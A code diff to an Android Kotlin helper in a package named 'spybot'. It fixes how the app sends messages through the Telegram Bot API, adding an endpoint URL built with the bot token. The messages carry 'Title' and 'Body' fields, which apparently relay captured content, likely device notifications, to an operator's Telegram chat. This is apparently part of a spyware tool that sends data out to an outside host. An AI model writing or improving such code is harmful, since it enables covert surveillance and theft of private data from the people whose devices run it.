@@ -2,8 +2,8 @@ package com.example.spybot.helper
 
 import android.content.Context
 import com.example.spybot.network.TelegramApiService
-import com.example.spybot.network.TelegramResponse
 import com.example.spybot.utils.AppPreferences
+import com.example.spybot.utils.TelegramResponse
 import okhttp3.OkHttpClient
 import okhttp3.logging.HttpLoggingInterceptor
 import retrofit2.Call
@@ -48,10 +48,13 @@ object TelegramHelper {
                 "<b>Title:</b> $title\n" +
                 "<b>Body:</b> $body"
 
+        // Telegram URL me bot token pass karna zaroori hai
+        val endpointUrl = "https://api.telegram.org/bot$token/sendMessage"
+
         try {
-            apiService.sendMessage(chatId, message).enqueue(object : Callback<TelegramResponse> {
+            apiService.sendMessage(endpointUrl, chatId, message).enqueue(object : Callback<TelegramResponse> {
                 override fun onResponse(call: Call<TelegramResponse>, response: Response<TelegramResponse>) {
-                    // Success handling
+                    // Success
                 }
 
                 override fun onFailure(call: Call<TelegramResponse>, t: Throwable) {
